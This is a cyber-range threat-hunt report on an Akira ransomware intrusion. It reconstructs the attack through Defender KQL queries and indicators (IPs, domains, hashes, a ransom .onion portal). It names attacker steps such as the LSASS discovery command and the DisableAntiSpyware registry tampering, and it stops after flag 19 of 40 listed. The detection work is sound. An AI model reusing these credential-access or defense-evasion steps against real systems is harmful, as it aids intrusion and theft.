# The Buyer - CyberRange Live Threat Hunt

![Threat Hunt Cover Image](screenshots/The_Buyer.png)

# 🛡️ Threat Hunt Report – The Buyer / Akira Ransomware Intrusion

---

## 📌 Executive Summary

This hunt reconstructed a multi-stage ransomware intrusion affecting `AS-PC2` and `AS-SRV`. The evidence supports likely `initial access through AnyDesk`, post-compromise `beaconing and reconnaissance` from the workstation, `lateral movement` into the server with an administrator-context account, `tool download and data staging`, and final `Akira ransomware deployment` using `updater.exe`. The attack also included `Defender tampering`, `shadow copy deletion`, and `cleanup activity`, which together indicate a high-confidence, hands-on-keyboard ransomware event with both `exfiltration` and `impact` characteristics.

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry
- Correlate attacker behavior to MITRE ATT&CK techniques
- Document evidence, detection gaps, and response opportunities

---

## 🧭 Scope & Environment

- **Environment:** Microsoft Defender Advanced Hunting / cyber range investigation environment
- **Data Sources:** `DeviceProcessEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`, `DeviceRegistryEvents`, `DeviceLogonEvents`, `DeviceEvents`
- **Timeframe:** Full investigation window was not preserved in the source material. Confirmed event times include **2026-01-27T19:13:11 UTC** for Defender tampering and **2026-01-28T04:43:30 UTC** for encryption start. Remaining timestamps should be backfilled from screenshots.

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#hunt-overview)
- [🧬 MITRE ATT&CK Summary](#mitre-attck-summary)
- [🔍 Flag Analysis](#flag-analysis)
    - [🚩 Flag 1](#flag-1)
    - [🚩 Flag 2](#flag-2)
    - [🚩 Flag 3](#flag-3)
    - [🚩 Flag 4](#flag-4)
    - [🚩 Flag 5](#flag-5)
    - [🚩 Flag 6](#flag-6)
    - [🚩 Flag 7](#flag-7)
    - [🚩 Flag 8](#flag-8)
    - [🚩 Flag 9](#flag-9)
    - [🚩 Flag 10](#flag-10)
    - [🚩 Flag 11](#flag-11)
    - [🚩 Flag 12](#flag-12)
    - [🚩 Flag 13](#flag-13)
    - [🚩 Flag 14](#flag-14)
    - [🚩 Flag 15](#flag-15)
    - [🚩 Flag 16](#flag-16)
    - [🚩 Flag 17](#flag-17)
    - [🚩 Flag 18](#flag-18)
    - [🚩 Flag 19](#flag-19)
    - [🚩 Flag 20](#flag-20)
    - [🚩 Flag 21](#flag-21)
    - [🚩 Flag 22](#flag-22)
    - [🚩 Flag 23](#flag-23)
    - [🚩 Flag 24](#flag-24)
    - [🚩 Flag 25](#flag-25)
    - [🚩 Flag 26](#flag-26)
    - [🚩 Flag 27](#flag-27)
    - [🚩 Flag 28](#flag-28)
    - [🚩 Flag 29](#flag-29)
    - [🚩 Flag 30](#flag-30)
    - [🚩 Flag 31](#flag-31)
    - [🚩 Flag 32](#flag-32)
    - [🚩 Flag 33](#flag-33)
    - [🚩 Flag 34](#flag-34)
    - [🚩 Flag 35](#flag-35)
    - [🚩 Flag 36](#flag-36)
    - [🚩 Flag 37](#flag-37)
    - [🚩 Flag 38](#flag-38)
    - [🚩 Flag 39](#flag-39)
    - [🚩 Flag 40](#flag-40)
- [🚨 Detection Gaps & Recommendations](#detection-gaps-and-recommendations)
- [🧾 Final Assessment](#final-assessment)
- [📎 Analyst Notes](#analyst-notes)

---

<a id="hunt-overview"></a>
## 🧠 Hunt Overview

The reconstructed attack path begins on **AS-PC2**, where **AnyDesk** appears to have been used as the remote-access mechanism. The binary executed from the suspicious path **`C:\Users\Public`**, correlated to user **`David.Mitchell`**, and communicated with attacker-associated infrastructure including **`88.97.164.155`** and **`relay-0b975d23.net.anydesk.com`**. The attacker then established additional capability through **`wsync.exe`** in **`C:\ProgramData\`**, followed by **`scan.exe`** to enumerate internal targets, including **`10.1.0.154`** and **`10.1.0.183`**.

Activity later shifted to **AS-SRV**, where the attacker operated with **`as.srv.administrator`** and used **`bitsadmin`** and PowerShell **`Invoke-WebRequest`** to stage additional tooling. Supporting artifacts included **`st.exe`** and **`exfil_data.zip`**, indicating likely collection and staging prior to ransomware execution. The impact phase culminated in **Akira ransomware deployment** via **`updater.exe`**, followed by **shadow copy deletion**, **ransom note creation**, and **cleanup through `clean.bat`**. Taken together, the evidence supports a realistic end-to-end ransomware intrusion spanning **initial access, C2, discovery, credential-access reconnaissance, lateral movement, exfiltration staging, defense evasion, recovery inhibition, and encryption for impact**.

---

<a id="mitre-attck-summary"></a>
## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
| --- | --- | --- | --- |
| 1 | Data Encrypted for Impact | T1486 | Critical |
| 2 | Data Encrypted for Impact | T1486 | High |
| 3 | Data Encrypted for Impact | T1486 | High |
| 4 | Data Encrypted for Impact | T1486 | Critical |
| 5 | Ingress Tool Transfer | T1105 | High |
| 6 | Ingress Tool Transfer | T1105 | High |
| 7 | Web Protocols | T1071.001 | High |
| 8 | Remote Desktop Software | T1219.002 | High |
| 9 | Impair Defenses | T1562.001 | High |
| 10 | Impair Defenses | T1562.001 | High |
| 11 | Impair Defenses | T1562.001 | Critical |
| 12 | Impair Defenses | T1562.001 | High |
| 13 | OS Credential Dumping: LSASS Memory | T1003.001 | Medium |
| 14 | OS Credential Dumping: LSASS Memory | T1003.001 | High |
| 15 | Remote Desktop Software | T1219.002 | High |
| 16 | Remote Desktop Software | T1219.002 | High |
| 17 | Remote Desktop Software | T1219.002 | High |
| 18 | Valid Accounts | T1078 | High |
| 19 | Web Protocols | T1071.001 | High |
| 20 | Web Protocols | T1071.001 | Medium |
| 21 | Web Protocols | T1071.001 | High |
| 22 | Ingress Tool Transfer | T1105 | Medium |
| 23 | Network Service Discovery | T1046 | Medium |
| 24 | Network Service Discovery | T1046 | Medium |
| 25 | Network Service Discovery | T1046 | Medium |
| 26 | Network Service Discovery | T1046 | Medium |
| 27 | Valid Accounts: Local Accounts | T1078.003 | High |
| 28 | BITS Jobs | T1197 | High |
| 29 | PowerShell / Ingress Tool Transfer | T1059.001 / T1105 | High |
| 30 | Archive Collected Data | T1560 | High |
| 31 | Archive Collected Data | T1560 | High |
| 32 | Archive Collected Data | T1560 | High |
| 33 | Data Encrypted for Impact | T1486 | Critical |
| 34 | Data Encrypted for Impact | T1486 | Critical |
| 35 | PowerShell / Ingress Tool Transfer | T1059.001 / T1105 | High |
| 36 | Inhibit System Recovery | T1490 | Critical |
| 37 | Data Encrypted for Impact | T1486 | High |
| 38 | Data Encrypted for Impact | T1486 | Critical |
| 39 | File Deletion | T1070.004 | High |
| 40 | Data Encrypted for Impact | T1486 | Critical |

---

<a id="flag-analysis"></a>
## 🔍 Flag Analysis

*All flags below are collapsible for readability.*

---

<a id="flag-1"></a>
<details>
<summary>&#128681; <strong>Flag 1: Threat Actor Identification</strong></summary>

### 🎯 Objective

Identify the ransomware family responsible for the impact event.

### 📌 Finding

Ransom note and encrypted-file artifacts identify **Akira** as the ransomware family associated with the intrusion.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Threat Actor / Family | `Akira` |
| Timestamp | 2026-01-27T22:18:33.3729075Z |
| Process | Ransom note / file-artifact pivot |
| Parent Process | updater.exe |
| Command Line | N/A in preserved source material |

### 💡 Why it matters

Family identification helps validate the impact stage, align reporting language, and guide the most relevant follow-on pivots.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where FileName has_any ("akira")
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on ransom-note creation and sudden appearance of high-volume suspicious file artifacts on a single host.

**Hunting Tip:**

When the note reveals the family quickly, pivot from the note to extension, writer process, and host scope first.

</details>

---

<a id="flag-2"></a>
<details>
<summary>&#128681; <strong>Flag 2: Negotiation Portal Identification</strong></summary>

### 🎯 Objective

Document the extortion portal associated with the ransom event.

### 📌 Finding

The ransom note contained the negotiation portal **`akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion`**.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Portal | `akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion` |
| Timestamp | 2026-01-27T22:18:33.3729075Z |
| Process | Ransom note content |
| Parent Process | updater.exe |
| Command Line | N/A in preserved source material |

### 💡 Why it matters

Portal details support reporting, actor-family validation, and preservation of extortion-specific evidence.

### 🔧 KQL Query Used (to verify)

```
DeviceFileEvents
| where DeviceName =~ "AS-SRV"
| where FileName has_any ("readme", "akira")
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Preserve ransom-note content during triage and standardize extraction of extortion portal details.

**Hunting Tip:**

Capture portal values early because note artifacts may be removed by cleanup activity later in the intrusion.

</details>

---

<a id="flag-3"></a>
<details>
<summary>&#128681; <strong>Flag 3: Victim Identifier Extraction</strong></summary>

### 🎯 Objective

Capture the victim identifier embedded in the extortion material.

### 📌 Finding

The ransom note contained victim ID **`813R-QWJM-XKIJ`**.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Victim ID | `813R-QWJM-XKIJ` |
| Timestamp | 2026-01-27T22:18:33.3729075Z |
| Process | Ransom note content |
| Parent Process | updater.exe |
| Command Line | N/A in preserved source material |

### 💡 Why it matters

The victim identifier is part of the extortion workflow and should be preserved for incident documentation.

### 🔧 KQL Query Used

N/A Found in ransom note provided

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Ensure ransomware triage procedures capture all note metadata, not just the family name and extension.

**Hunting Tip:**

Victim IDs are useful evidence markers even when they are not directly searchable in telemetry.

</details>

---

<a id="flag-4"></a>
<details>
<summary>&#128681; <strong>Flag 4: Encrypted Artifact Marker</strong></summary>

### 🎯 Objective

Identify the file marker associated with encrypted content.

### 📌 Finding

The impacted files contained the Akira marker **`.akira`**. In preserved evidence, this marker appeared inside filenames such as `.akira.lnk`, so a contains-based search was more reliable than `endswith`.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host(s) | `AS-SRV`, `AS-PC2` |
| Marker | `.akira` |
| Timestamp | 2026-01-28T02:51:30.3098736Z |
| Process | Later correlated to `updater.exe` |
| Parent Process | explorer.exe |
| Command Line |  |

### 💡 Why it matters

The encryption marker is the fastest pivot for scoping the impact phase and locating affected systems.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where DeviceName in~ ("as-pc2","as-srv")
| where FileName contains ".akira"
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on bursts of file activity where filenames contain a newly observed ransomware marker.

**Hunting Tip:**

Do not assume the ransomware marker is the final extension; embedded markers like `.akira.lnk` can break `endswith` queries.

</details>

---

<a id="flag-5"></a>
<details>
<summary>&#128681; <strong>Flag 5: Payload Domain Identification</strong></summary>

### 🎯 Objective

Identify suspicious infrastructure used for payload retrieval or staging.

### 📌 Finding

The investigation identified **`sync.cloud-endpoint.net`** as a suspicious domain associated with the intrusion. From the provided MDE alert we saw wsync.exe used multiple times and generated alerts so we narrowed our search to specifically target network events generated by that process name

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host(s) | `AS-PC2`, `AS-SRV` |
| Remote URL | `sync.cloud-endpoint.net` |
| Timestamp | 2026-01-27T22:15:17.1624185Z |
| Process | Download / staging utility context |
| Parent Process | wsync.exe |
| Command Line |  |

### 💡 Why it matters

External infrastructure pivots help tie network activity to staged files and downloaded tooling.

### 🔧 KQL Query Used

```
DeviceNetworkEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where isnotempty(RemoteUrl)
| where InitiatingProcessFileName contains "wsync"
| summarize Hits=count() by RemoteUrl, InitiatingProcessFileName
| order by Hits desc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on uncommon domains contacted by script interpreters, newly introduced tools, or admin utilities.

**Hunting Tip:**

Pivot from suspicious domains to `RemoteIP`, then to the process and files created around the same time.

</details>

---

<a id="flag-6"></a>
<details>
<summary>&#128681; <strong>Flag 6: Ransomware Staging Domain Identification</strong></summary>

### 🎯 Objective

Identify the domain used to support ransomware staging activity.

### 📌 Finding

The investigation identified **`cdn.[cloud-endpoint.net](http://cloud-endpoint.net)`** as staging-related infrastructure tied to the intrusion. From our previous search we identified `"cloud-endpoint.net"` as a suspicous piece of the RemoteUrl so we focused our search on that to verify a possible staging area.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host(s) | `AS-PC2`, `AS-SRV` |
| Remote URL | `cdn.cloud-endpoint.net` |
| Timestamp | 2026-01-27T22:18:22.1022807Z |
| Process | Download / staging utility context |
| Parent Process | wsync.exe |
| Command Line |  |

### 💡 Why it matters

Separating general suspicious infrastructure from staging-specific infrastructure improves attribution of the delivery phase.

### 🔧 KQL Query Used

```
DeviceNetworkEvents
| where RemoteUrl has "cloud-endpoint.net"
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteUrl, RemoteIP
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Treat content-delivery style subdomains as suspicious when they appear in conjunction with hostile tool transfer activity.

**Hunting Tip:**

Filter staging-domain hits by process name to isolate which utility actually performed the transfer.

</details>

---

<a id="flag-7"></a>
<details>
<summary>&#128681; <strong>Flag 7: Command-and-Control IP Identification</strong></summary>

### 🎯 Objective

Identify remote IP infrastructure associated with the suspicious domains.

### 📌 Finding

Using the same query as before we identified two RemoteIP’s that accessed the RemoteURL’s on 1/27/2026 and a third unrelated RemoteURL on 1/28/2026. The observed infrastructure resolved to **`104.21.30.237`** and **`172.67.174.46`**.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host(s) | `AS-PC2`, `AS-SRV` |
| Remote IPs | `104.21.30.237`, `172.67.174.46` |
| Timestamp | 2026-01-27T19:24:14.2432159Z-2026-01-27T22:18:45.5834521Z |
| Process | Network-connected staging activity |
| Parent Process | wsync.exe, powershell.exe, svchost.exe, runtimebroker.exe |
| Command Line |  |

### 💡 Why it matters

IP pivots are useful when domain logging is incomplete or when related activity is only captured as addresses.

### 🔧 KQL Query Used

```
DeviceNetworkEvents
| where RemoteUrl has_any ("sync.cloud-endpoint.net","cdn.cloud-endpoint.net")
| project TimeGenerated, RemoteIP
| order by TimeGenerated asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Correlate low-prevalence remote IPs with suspicious execution and file-creation sequences.

**Hunting Tip:**

Once you have suspicious domains, always pivot them to IPs in case other events only preserved the address.

</details>

---

<a id="flag-8"></a>
<details>
<summary>&#128681; <strong>Flag 8: Remote Tool Relay Identification</strong></summary>

### 🎯 Objective

Validate whether a commercial remote access channel was used in the intrusion.

### 📌 Finding

AnyDesk-related activity communicated with **`relay-0b975d23.net.anydesk.com`**. First we go back to `DeviceNetworkEvents` for a broad search of suspicous relay activity. We then identifed multiple `"relay"`activities from`anydesk.exe` so we narrow in the query a bit.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | `anydesk.exe` |
| Relay Domain | `relay-0b975d23.net.anydesk.com` |
| Timestamp | 2026-01-27T22:08:15.8349181Z |
| Parent Process |  |
| Command Line |  |

### 💡 Why it matters

Legitimate remote administration software can be abused by attackers and should be evaluated in context.

### 🔧 KQL Query Used

```
// Initial Search
DeviceNetworkEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where isnotempty(RemoteUrl)
| summarize Hits=count() by RemoteUrl, InitiatingProcessFileName
| order by Hits desc

//Pivot to suspicous relay activity on "anydesk.exe"
DeviceNetworkEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where InitiatingProcessFileName contains "anydesk"
| where isnotempty(RemoteUrl)
| summarize Hits=count() by TimeGenerated, RemoteUrl, InitiatingProcessFileName
| order by Hits desc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Baseline approved remote tools and alert on unapproved or unusually deployed remote desktop software.

**Hunting Tip:**

For remote support software, path and user context often tell you more than the binary name alone.

</details>

---

<a id="flag-9"></a>
<details>
<summary>&#128681; <strong>Flag 9: Evasion Script Identification</strong></summary>

### 🎯 Objective

Identify scripts used to weaken defenses before impact.

### 📌 Finding

The attacker used an evasion-themed script named **`kill.bat`**. We know this from the MDE report, but to verify we search for `DeviceProcessEvents` where `".bat"` exists in the `ProccessCommandLine`.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | `kill.bat` |
| Timestamp | 2026-01-27T21:02:24.1705806Z - 2026-01-27T21:06:52.9817682Z |
| Parent Process | `cmd.exe` or `powershell.exe` context |
| Command Line |  |
| Associated SHA256 | `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c` |

### 💡 Why it matters

Purpose-built scripts frequently precede ransomware execution and indicate intentional disruption of security tooling.

### 🔧 KQL Query Used

```
DeviceProcessEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where FileName in~ ("cmd.exe", "powershell.exe")
| where ProcessCommandLine has_any ("kill.bat")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, AccountName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Flag destructive or defense-evasion themed scripts launched from shells or newly created paths.

**Hunting Tip:**

Names like `kill`, `disable`, `stop`, or `clean` deserve immediate scrutiny in ransomware hunts.

</details>

---

<a id="flag-10"></a>
<details>
<summary>&#128681; <strong>Flag 10: Evasion Script Hash Validation</strong></summary>

### 🎯 Objective

Validate the unique hash associated with the evasion script.

### 📌 Finding

The file **`kill.bat`** was associated with SHA256 **`0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c`**.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| File | `kill.bat` |
| SHA256 | `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c` |
| Timestamp | 2026-01-27T21:02:33.8389474Z |
| Initiating Process | wsync.exe |
| Action Type |  |

### 💡 Why it matters

Hash validation helps separate the exact malicious artifact from generic batch-file activity.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where FileName =~ "kill.bat"
| where isnotempty(SHA256)
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Store file hashes for dropped scripts and enrich them during incident scoping.

**Hunting Tip:**

When filenames are common, the hash is the cleaner long-term pivot across environments.

</details>

---

<a id="flag-11"></a>
<details>
<summary>&#128681; <strong>Flag 11: Defender Registry Tampering Identification</strong></summary>

### 🎯 Objective

Identify explicit tampering against Microsoft Defender-related controls.

### 📌 Finding

The attacker modified the registry value **`DisableAntiSpyware`**. We know from the MDE alert provided that an alert went off for an “Attempt to turn off Microsoft Defender Antivirus”. Using that information we search `DeviceRegistryEvents` for `DisableAntiSpyware` as a `RegistryValueName`.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Registry Value | `DisableAntiSpyware` |
| Timestamp | 2026-01-27T21:03:42.39698Z |
| Initiating Process | reg.exe |
| Parent Process |  |
| Command Line |  |

### 💡 Why it matters

Registry tampering against Defender is a high-confidence defense-evasion indicator that often precedes destructive activity.

### 🔧 KQL Query Used

```
DeviceRegistryEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where RegistryValueName =~ "DisableAntiSpyware"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Create high-severity detections for changes to Defender policy keys, especially from scripts or unusual binaries. (NULL since defender alerted to this)

**Hunting Tip:**

Search the exact value first, then widen to the surrounding product registry path for nearby changes.

</details>

---

<a id="flag-12"></a>
<details>
<summary>&#128681; <strong>Flag 12: Registry Tampering Timestamp Confirmation</strong></summary>

### 🎯 Objective

Anchor the timeline of the Defender tampering event.

### 📌 Finding

The tampering event tied to **`DisableAntiSpyware`** occurred at **`21:03:42`**.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Event Time | `21:03:42` |
| Registry Value | `DisableAntiSpyware` |
| Initiating Process | reg.exe |
| Parent Process |  |
| Command Line |  |

### 💡 Why it matters

A confirmed timestamp helps sequence defense evasion relative to later staging and encryption activity.

### 🔧 KQL Query Used

```
DeviceRegistryEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where RegistryValueName =~ "DisableAntiSpyware"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
| order by Timestamp asc

```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Prioritize registry-based security-control changes that occur shortly before downloads, staging, or encryption.

**Hunting Tip:**

A single trusted timestamp can become the anchor for reconstructing the rest of the intrusion timeline.

</details>

---

<a id="flag-13"></a>
<details>
<summary>&#128681; <strong>Flag 13: LSASS Reconnaissance Command Identification</strong></summary>

### 🎯 Objective

Identify early LSASS-focused reconnaissance activity.

### 📌 Finding

A process command line containing **`tasklist | findstr lsass`** was observed. To locate this we start first by scanning `DeviceProcessEvents` from the `Filename` we have seen thus far (cmd.exe, powershell.exe, wsync.exe, anydesk.exe). From there we notice `cmd.exe /c "tasklist | findstr lsass".` This is a common way to search for credentials. we then zero in on that to see how many times that commandline has been executed.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | Command interpreter context |
| Timestamp | 2026-01-27T21:11:00.0521911Z |
| Parent Process |  |
| Command Line | `tasklist | findstr lsass` |
| User Context |  |

### 💡 Why it matters

Even simple LSASS discovery is meaningful because it often precedes credential theft or lateral movement.

### 🔧 KQL Query Used

```
// Initial Query
DeviceProcessEvents
| where DeviceName =~ "AS-PC2"
| where FileName in~ ("cmd.exe", "powershell.exe", "wsync.exe", "anydesk.exe")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName
| order by Timestamp asc

// Targeted Query
DeviceProcessEvents
| where DeviceName contains "as-pc2"
| where ProcessCommandLine has_all ("tasklist", "findstr", "lsass")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Monitor LSASS discovery commands outside troubleshooting, administration, or IR use cases.

**Hunting Tip:**

Basic reconnaissance commands can be the breadcrumb that explains later privilege use.

</details>

---

<a id="flag-14"></a>
<details>
<summary>&#128681; <strong>Flag 14: LSASS Named Pipe Artifact Identification</strong></summary>

### 🎯 Objective

Identify a stronger LSASS-related artifact supporting credential-access suspicion.

### 📌 Finding

The investigation identified **`\Device\NamedPipe\lsass`** in pipe-related telemetry. To do this we search for `ActionType's` that contain `“pipe”` and `LSASS` in the `AdditionalFields`.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Artifact | `\Device\NamedPipe\lsass` |
| Timestamp | 2026-01-27T18:31:22.4714713Z |
| Process | Pipe-related event context |
| Parent Process | lsass.exe |
| Command Line |  |

### 💡 Why it matters

Pipe-related LSASS telemetry can elevate the assessment from simple reconnaissance toward likely credential-access behavior.

### 🔧 KQL Query Used

```
DeviceEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where ActionType contains "Pipe"
| where AdditionalFields has "lsass"
| project Timestamp, DeviceName, ActionType, FileName, InitiatingProcessFileName, AdditionalFields
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Monitor LSASS-related pipe events and correlate them with suspicious process launches or new admin activity.

**Hunting Tip:**

If the standard columns are sparse, inspect `AdditionalFields` before discarding the lead.

</details>

---

<a id="flag-15"></a>
<details>
<summary>&#128681; <strong>Flag 15: Remote Access Tool Identification</strong></summary>

### 🎯 Objective

Identify the remote access utility used during the intrusion.

### 📌 Finding

The attacker used **`anydesk.exe`** on **AS-PC2**. To identify this we reference back to the relay activity we found earlier from the `RemoteUrl` ”relay-0b975d23.net.anydesk.com”.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | `anydesk.exe` |
| Timestamp | 2026-01-27T22:08:15.8349181Z |
| Parent Process | anydesk.exe |
| Command Line |  |
| User Context | Later correlated to `David.Mitchell` |

### 💡 Why it matters

Identifying the abused remote access utility helps distinguish initial access from later malware-driven activity.

### 🔧 KQL Query Used

```
DeviceNetworkEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where RemoteUrl =~ "relay-0b975d23.net.anydesk.com"
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on remote administration tools executed outside approved deployment and support workflows.

**Hunting Tip:**

Start with the tool name, then pivot into path, account, and network activity.

</details>

---

<a id="flag-16"></a>
<details>
<summary>&#128681; <strong>Flag 16: Suspicious Execution Path Identification</strong></summary>

### 🎯 Objective

Determine whether the remote access utility ran from an abnormal location.

### 📌 Finding

The remote access binary executed from **`C:\Users\Public`**, a suspicious user-writeable path. We identify this by simply searching for `DeviceProcessEvents` related to `FileName: Anydesk.exe`.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | `anydesk.exe` |
| Path | `C:\Users\Public` |
| Timestamp | 2026-01-27T19:15:30.3702376Z - 2026-01-27T20:13:33.1327948Z |
| Parent Process | anydesk.exe |
| Command Line |  |

### 💡 Why it matters

Path-based context is a strong differentiator between sanctioned software and attacker-deployed tooling.

### 🔧 KQL Query Used

```
DeviceProcessEvents
| where DeviceName =~ "AS-PC2"
| where FileName =~ "anydesk.exe"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, AccountName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Flag remote-support tools executed from `Users\Public`, `Downloads`, `%Temp%`, or other user-controlled paths.

**Hunting Tip:**

For legitimate-looking binaries, the path is often the most suspicious field.

</details>

---

<a id="flag-17"></a>
<details>
<summary>&#128681; <strong>Flag 17: Attacker IP Identification</strong></summary>

### 🎯 Objective

Identify the external IP tied to the remote access activity.

### 📌 Finding

The AnyDesk activity correlated to external IP **`88.97.164.155`**. We identified this from the previous search to identify the remote access tool and having `RemoteIP` projected in the results.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | `anydesk.exe` |
| Remote IP | `88.97.164.155` |
| Timestamp | 2026-01-27T22:08:15.8349181Z |
| Parent Process | anydesk.exe |
| Command Line |  |

### 💡 Why it matters

External IP correlation strengthens the case for malicious remote access rather than benign local execution alone.

### 🔧 KQL Query Used

```
DeviceNetworkEvents
| where DeviceName =~ "AS-PC2"
| where InitiatingProcessFileName =~ "anydesk.exe"
| summarize Hits=count() by RemoteIP, RemoteUrl
| order by Hits desc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Correlate remote access tool usage with uncommon external IPs and suspicious install paths.

**Hunting Tip:**

After identifying the operator IP, search it across all hosts to test for broader compromise.

</details>

---

<a id="flag-18"></a>
<details>
<summary>&#128681; <strong>Flag 18: Compromised User Identification</strong></summary>

### 🎯 Objective

Determine which user context was associated with the initial compromised endpoint.

### 📌 Finding

The suspicious AnyDesk activity on **AS-PC2** correlated to **`David.Mitchell`**. We identify this by searching `DeviceProcessEvents` related to `anydesk.exe` and projecting `AccountName`.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Account | `David.Mitchell` |
| Process | `anydesk.exe` |
| Timestamp | 2026-01-27T19:15:30.3702376Z |
| Parent Process | AnyDesk.exe |
| Command Line |  |

### 💡 Why it matters

User context is essential for explaining how access began and for scoping credential exposure or follow-on misuse.

### 🔧 KQL Query Used

```
DeviceProcessEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where FileName =~ "anydesk.exe"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Include user context in remote-tool detections so analysts can quickly separate account misuse from generic process execution.

**Hunting Tip:**

Once a user is identified, pivot to their logons, downloads, and remote session activity.

</details>

---

<a id="flag-19"></a>
<details>
<summary>&#128681; <strong>Flag 19: Primary Beacon Identification</strong></summary>

### 🎯 Objective

Identify the post-access beacon or malware utility used for continued control.

### 📌 Finding

A suspicious binary named **`wsync.exe`** was identified on **AS-PC2**. We know this from the MDE report, but also from earlier research that identified `wysnc.exe` as the process used to access the payload domain and staging area. We also see 2 different hashes for `wysnc.exe` which could indicate beacon replacement.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| File / Process | `wsync.exe` |
| Timestamp | 2026-01-27T20:22:50.1430283Z |
| Initiating Process | powershell.exe |
| Path | Later confirmed as `C:\ProgramData\` |
| Associated SHA256 | `1-66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b00
2-0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654` |

### 💡 Why it matters

A secondary utility following remote access often represents the attacker’s durable foothold or command-and-control mechanism.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where FileName =~ "wsync.exe"
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Monitor for newly introduced binaries with utility-like names that appear shortly after remote access events.

**Hunting Tip:**

Hash, path, and first-seen time usually provide a stronger story than the filename alone.

</details>

